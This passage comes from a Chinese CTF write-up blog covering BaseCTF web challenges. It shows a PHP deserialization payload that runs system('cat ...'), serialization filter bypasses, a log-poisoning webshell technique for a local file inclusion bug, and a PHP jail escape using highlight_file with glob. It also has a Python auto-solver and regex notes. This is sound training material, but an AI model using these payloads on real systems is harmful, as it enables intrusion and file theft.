class="hljs-variable">$h</span>);<br> <br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//?a=O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:33:&quot;system(&quot;cat /fffffffffflagafag&quot;);&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h5 id="对类属性不敏感"><a href="#对类属性不敏感" class="headerlink" title="对类属性不敏感"></a><font style="color:rgb(79, 79, 79);">对类属性不敏感</font></h5><p><font style="color:rgb(77, 77, 77);">protected和private属性的属性名与public属性的属性名不同，由于对属性不敏感，即使不加%00* %00和%00类名%00也可以被正确解析；</font></p><h5 id="大写S当十六进制绕过"><a href="#大写S当十六进制绕过" class="headerlink" title="大写S当十六进制绕过"></a><font style="color:rgb(79, 79, 79);">大写S当</font><font style="color:rgb(78, 161, 219) !important;">十六进制</font><font style="color:rgb(79, 79, 79);">绕过</font></h5><p><font style="color:rgb(77, 77, 77);">表示字符串类型的s大写为S时，其对应的值会被当作十六进制解析；</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">例如   s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>  中的Object被过滤<br> <br>可改为  S:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileOb\6aect&quot;</span><br> <br>小写s变大写S，长度<span class="hljs-number">13</span>不变，\<span class="hljs-number">6</span>a是字符j的十六进制编码<br></code></pre></td></tr></table></figure><h5 id="php类名不区分大小写"><a href="#php类名不区分大小写" class="headerlink" title="php类名不区分大小写"></a><font style="color:rgb(79, 79, 79);">php类名不区分大小写</font></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;11&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;22&quot;</span>;&#125;<br> <br>等效于<br> <br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;11&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;22&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731650448775-0c1c7995-d7b2-4a9d-a626-152e15f7f924.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731650460766-e7882cdc-3fcc-467f-bd8d-ef8352a2a205.png"></p><p>涉及到快速计算明显不是人力能做到的所以考察的是编写脚本</p><p>脚本内容如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>req = requests.session()<br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20289/&quot;</span><br><br>answer = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = req.post(url , data=&#123;<span class="hljs-string">&quot;answer&quot;</span>: answer&#125;)<br>    <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;BaseCTF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(response.text)<br>        <span class="hljs-keyword">break</span><br>    regex = <span class="hljs-string">r&quot; (\d*?)(.)(\d*)\?&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;+&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) + <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;-&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) - <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;×&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) * <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;÷&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) // <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731654635574-3147b864-8794-4100-a90d-48870b9fc6bb.png"></p><h4 id="关于编写此脚本的几个知识点"><a href="#关于编写此脚本的几个知识点" class="headerlink" title="关于编写此脚本的几个知识点"></a>关于编写此脚本的几个知识点</h4><h5 id="requests库的http请求"><a href="#requests库的http请求" class="headerlink" title="requests库的http请求"></a>requests库的http请求</h5><p>参考文章<a href="https://www.jianshu.com/p/67b58a48c1c8">链接</a></p><p>requests 库提供了一个简单易用的 API 来发送 HTTP 请求。以下是一些基本的请求方法：</p><p>   get(url, **kwargs): 发送一个GET请求。</p><p>   post(url, data&#x3D;None, **kwargs): 发送一个POST请求，data可以是字典、字节或文件对象。</p><p>   put(url, data&#x3D;None, **kwargs): 发送一个PUT请求。</p><p>   delete(url, **kwargs): 发送一个DELETE请求。</p><p>   head(url, **kwargs): 发送一个HEAD请求，只获取页面的HTTP头信息。</p><p>   options(url, **kwargs): 发送一个OPTIONS请求，获取服务器支持的HTTP方法。</p><p>   patch(url, data&#x3D;None, **kwargs): 发送一个PATCH请求。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests  # 引入requests库<br><br>payload = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><br>response = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;http://example.com&#x27;</span>)<br>response = requests.post(<span class="hljs-string">&#x27;http://example.com/submit&#x27;</span>, <span class="hljs-keyword">data</span>=payload)<br>response = requests.put(<span class="hljs-string">&#x27;http://example.com/put&#x27;</span>, <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&#x27;key&#x27;</span>: <span class="hljs-string">&#x27;value&#x27;</span>&#125;)<br>response = requests.delete(<span class="hljs-string">&#x27;http://example.com/delete&#x27;</span>)<br>response = requests.head(<span class="hljs-string">&#x27;http://example.com/get&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="re库（正则匹配的使用）"><a href="#re库（正则匹配的使用）" class="headerlink" title="re库（正则匹配的使用）"></a>re库（正则匹配的使用）</h5><p><a href="https://blog.csdn.net/dgw2648633809/article/details/135717819">链接</a>(参考文献)</p><h6 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile()函数"></a><font style="color:#4f4f4f;background-color:#ffffff;">compile()函数</font></h6><p>基本用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br> <br><span class="hljs-comment"># 匹配一个或多个连续的数字字符</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d+&#x27;</span>) <br> <br><span class="hljs-comment"># 匹配email电邮地址</span><br>email_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]&#123;2,&#125;\b&#x27;</span>, re.IGNORECASE)<br> <br><span class="hljs-comment"># 匹配任意字母数字组成的用户名（至少1个字符）</span><br>username_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\w+&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配任意URL链接</span><br>url_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配电话号码（格式如：123-456-7890 或 (123) 456-7890）</span><br>phone_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(\d&#123;3&#125;[-\.\s]??\d&#123;3&#125;[-\.\s]??\d&#123;4&#125;|\(\d&#123;3&#125;\)\s*\d&#123;3&#125;[-\.\s]??\d&#123;4&#125;)&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配IPv4地址</span><br>ipv4_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配信用卡号（一般为16位数字，可能包含空格分隔符）</span><br>credit_card_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#123;4&#125;[- ]?\d&#123;4&#125;[- ]?\d&#123;4&#125;[- ]?\d&#123;4&#125;&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配日期格式（YYYY-MM-DD）</span><br>date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配颜色代码（如 #FF0000）</span><br>color_code_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;^#([A-Fa-f0-9]&#123;6&#125;|[A-Fa-f0-9]&#123;3&#125;)$&#x27;</span>)<br> <br><span class="hljs-comment"># 匹配整数和小数（包括负数、正数和零）</span><br>number_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;-?\d+(\.\d+)?&#x27;</span>)<br></code></pre></td></tr></table></figure><h6 id="正则表达式常用规则字符"><a href="#正则表达式常用规则字符" class="headerlink" title="正则表达式常用规则字符"></a><font style="color:#4f4f4f;background-color:#ffffff;">正则表达式常用规则字符</font></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">\d：在大多数正则表达式语法中（包括Python中的 re 模块），\d 相当于 [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]，即它会匹配任意一个十进制数字字符，相当于阿拉伯数字从<span class="hljs-number">0</span>到<span class="hljs-number">9</span>。<br><br>+：这是一个量词，表示前面的元素（这里是\d）至少出现一次或多次。因此，\d+ 作为一个整体，它会匹配一个或连续的一个以上数字字符，例如 <span class="hljs-string">&quot;123&quot;</span>、<span class="hljs-string">&quot;456789&quot;</span> 等等。<br><br>\w：匹配字母（大写或小写）、数字和下划线（等价于 [a-zA-Z0-9_]）。<br>\s：匹配任何空白字符，包括空格、制表符、换行符等。<br>. （句点）：匹配除换行符之外的任何单个字符。<br>^：在字符串起始位置时匹配，或者在字符类 [] 中表示反向选择（如 [^abc] 匹配非 a、b、c 的字符）。<br>$：在字符串结束位置时匹配。<br>*：零次或多次匹配前面的元素。<br>?：零次或一次匹配前面的元素。<br>&#123;m,n&#125;：前面的元素至少出现 m 次，至多出现 n 次。<br>|：表示“或”操作，用于匹配多个选项之一。<br>()：用于分组和捕获子匹配项。<br></code></pre></td></tr></table></figure><h6 id="match方法"><a href="#match方法" class="headerlink" title="match方法"></a><font style="color:#4f4f4f;background-color:#ffffff;">match方法</font></h6><p><font style="color:#4d4d4d;background-color:#ffffff;">pattern.match()方法只检测字符串开始位置是否满足匹配条件</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br> <br>text = <span class="hljs-string">&quot;2023-01-01 This is a date at the start of the string.&quot;</span><br> <br><span class="hljs-comment"># 使用match()方法，只从字符串开始位置匹配日期格式</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span>)<br>match_result = pattern.<span class="hljs-keyword">match</span>(text)<br> <br><span class="hljs-keyword">if</span> match_result:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Match found: <span class="hljs-subst">&#123;match_result.group(<span class="hljs-number">0</span>)&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No match at the beginning of the string.&quot;</span>)<br> <br><span class="hljs-comment"># 输出：</span><br><span class="hljs-comment"># Match found: 2023-01-01</span><br></code></pre></td></tr></table></figure><h6 id="search方法"><a href="#search方法" class="headerlink" title="search方法"></a><font style="color:#4f4f4f;background-color:#ffffff;">search方法</font></h6><p><font style="color:#4d4d4d;background-color:#ffffff;">而pattern.search()方法会搜索整个字符串以找到第一个匹配项。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br> <br>text = <span class="hljs-string">&quot;The date today is 2023-01-01, let&#x27;s remember it.&quot;</span><br> <br><span class="hljs-comment"># 使用search()方法在整个字符串中搜索日期格式</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span>)<br>search_result = pattern.search(text)<br> <br><span class="hljs-keyword">if</span> search_result:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Search found: <span class="hljs-subst">&#123;search_result.group(<span class="hljs-number">0</span>)&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No match found in the string.&quot;</span>)<br> <br><span class="hljs-comment"># 输出：</span><br><span class="hljs-comment"># Search found: 2023-01-01</span><br></code></pre></td></tr></table></figure><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$incompetent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;incompetent&#x27;</span>];<br><span class="hljs-variable">$Datch</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Datch&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$incompetent</span> !== <span class="hljs-string">&#x27;HelloWorld&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;写出程序员的第一行问候吧！&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//这是个什么东东？？？</span><br><span class="hljs-variable">$required_chars</span> = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>];<br><span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">true</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$required_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$char</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_valid</span>) &#123;<br><br>    <span class="hljs-variable">$invalid_patterns</span> = [<span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;http://&#x27;</span>, <span class="hljs-string">&#x27;https://&#x27;</span>, <span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;file://&#x27;</span> , <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;gopher://&#x27;</span>];<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$invalid_patterns</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pattern</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$pattern</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;此路不通换条路试试?&#x27;</span>);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$Datch</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;文件名不合规 请重试&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>写出程序员的第一行问候吧！<br></code></pre></td></tr></table></figure><p>其中过滤了各种php伪协议 于是我们使用日志包含绕过 由于有回显 所以在POST传参后接任意命令执行</p><p>利用burpsite抓包并修改数据包</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731720279973-3b736b33-faf5-44d7-9ef3-71791e6f07c1.png"></p><p>从而得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731720294342-a8a4417d-1615-4488-b557-2a3d849159c1.png"></p><h4 id="关于日志文件包含漏洞"><a href="#关于日志文件包含漏洞" class="headerlink" title="关于日志文件包含漏洞"></a>关于日志文件包含漏洞</h4><p>当某个PHP文件只存在本地包含漏洞，不存在远程包含漏洞，而却无法上传正常文件(无上传功能)，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。</p><p>Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中</p><p>例如:<a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=</a>…&#x2F;…&#x2F;…&#x2F;…&#x2F;Apache-20\logs\access.log</p><p>使用的是DVWA环境 安全等级低</p><p>首先要把一句话木马写入到access.log访问日志中</p><p>直接在URL中加入一句话木马，回车，虽然会报错，但是没关系，我们的一句话木马已经被access文件记录了 之后只需要利用本地包含文件来运行access.log就可以了</p><p>注意要用…&#x2F;来调整目录</p><p>注释：（题目使用的是nginx服务器 但是原理是一样的）</p><h4 id="日志文件的注入"><a href="#日志文件的注入" class="headerlink" title="日志文件的注入"></a><font style="color:rgb(79, 79, 79);">日志文件的注入</font></h4><p><a href="https://blog.csdn.net/qq_74350234/article/details/142160769?ops_request_misc=%257B%2522request%255Fid%2522%253A%25228B674EF4-4242-40BA-8D2F-DA52863146D6%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=8B674EF4-4242-40BA-8D2F-DA52863146D6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-142160769-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6ctf&spm=1018.2226.3001.4187">链接</a>（参考文章）</p><p><font style="color:rgb(77, 77, 77);">1.首先介绍日志文件的作用：通俗来说日志文件(access.log)可以记录我们所有在服务器上的操作记录</font></p><p><font style="color:rgb(77, 77, 77);">2.getshell的过程也很简单，我们可以在</font><strong><font style="color:rgb(254, 44, 36);">UA（user-agent）输入木马</font></strong><font style="color:rgb(77, 77, 77);">(常用)</font></p><p><font style="color:rgb(77, 77, 77);">执行，也可在</font><strong><font style="color:rgb(254, 44, 36);">url后面加上一句话木马</font></strong><font style="color:rgb(77, 77, 77);">(常被url编码)执行</font></p><p><font style="color:rgb(77, 77, 77);">例如：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722687448-22916442-495f-41cb-9e2d-43316647b250.png"></p><p><font style="color:rgb(77, 77, 77);">但当我们利用参数a执行ls命令的时候，发现没有成功，原来是因为日志文件里的木马被</font><strong><font style="color:rgb(254, 44, 36);">url编码</font></strong><font style="color:rgb(77, 77, 77);">过了，但我们想要让日志文件的木马是</font><strong><font style="color:rgb(254, 44, 36);">未被urlencode</font></strong><font style="color:rgb(77, 77, 77);">的</font></p><p><font style="color:rgb(77, 77, 77);">(注：include包含html或者文本文件，其内容会被直接输出的，这里就是直接输出了日志文件内容）</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722735571-0854a39d-abe5-440d-9a8c-9a3dc30d491f.png"></p><p>所以我们可以通过bp传一句话木马，bp传参的时候是不会经过浏览器url编码的，而是直接到服务器进行urldecode</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722771959-5a5ba90b-38b3-49e8-8c6a-e5aaafe4fc69.png"></p><p><font style="color:rgb(77, 77, 77);">或者直接在ua处添加</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722796262-11025aac-da35-445d-a5d4-747b13d590f2.png"></p><p><font style="color:rgb(77, 77, 77);">然后我们对参数执行命令即可</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722817573-7c456370-5486-4da6-860a-6f69d80d74af.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722831737-358836e4-98ab-4860-94a0-545a484cb930.png"></p><p>或者我们还可以用蚁剑连接日志文件中的php木马</p><p>无论哪种方法本质都是一样的，都是利用日志文件的webshell得到flag</p><h2 id="EZ-PHP-Jail"><a href="#EZ-PHP-Jail" class="headerlink" title="EZ_PHP_Jail"></a>EZ_PHP_Jail</h2><p>题目代码<img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740413988-4cb7518f-ab5d-45d7-a3a6-5a339dabcffd.png"></p><p>右键查看源代码后发现一段base64密文</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740452983-ed7ef978-ad59-4ef1-95fd-bbd3ea2a93a5.png">解密后得到</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740471481-8b84364a-700f-4a26-828c-fdaba9465a81.png"></p><p>访问后进入phpinfo</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740510414-42b9e31e-a3d4-4444-b72e-5cb7f6fa5c2d.png"></p><p>发现禁用了很多漏洞函数 </p><p>所以我们可以利用highlight_file配合glob</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">highlight_file配合glob, glob 通常用于匹配符合特定规则的文件路径名, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/f*&quot;</span>) 会搜索文件系统中所有以 /f 开头的文件或目录。然后，通过 [<span class="hljs-number">0</span>] 索引选择第一个匹配的结果<br><br>?Jail[by.Happy=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/fl*&quot;</span>)[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740757776-f3b2d729-e120-4a9d-ba9a-20cebc9e741c.png"></p><h4 id="PHP的小知识点"><a href="#PHP的小知识点" class="headerlink" title="PHP的小知识点"></a>PHP的小知识点</h4><p><font style="color:rgb(77, 77, 77);">当 php 版本⼩于 8 时，</font><a href="https://so.csdn.net/so/search?q=GET%20%E8%AF%B7%E6%B1%82&spm=1001.2101.3001.7020"><font style="color:rgb(77, 77, 77);">GET 请求</font></a><font style="color:rgb(77, 77, 77);">的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</font></p><p><font style="color:rgb(77, 77, 77);">个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ </font></p><h4 id="PHP中的highlight-file-函数"><a href="#PHP中的highlight-file-函数" class="headerlink" title="PHP中的highlight_file()函数"></a><font style="color:rgb(77, 77, 77);">PHP中的highlight_file()函数</font></h4><p><font style="color:rgb(77, 77, 77);">h</font><font style="color:rgb(77, 77, 77);">ighlight_file()函数是PHP中的一个内置函数，用于突出显示文件的语法。通过使用HTML标记突出显示语法。</font></p><p><font style="color:rgb(77, 77, 77);">用法: highlight_file( $filename, $return )</font></p><p><font style="color:rgb(77, 77, 77);">参数：该函数接受上述和以下描述的两个参数：</font></p><p><font 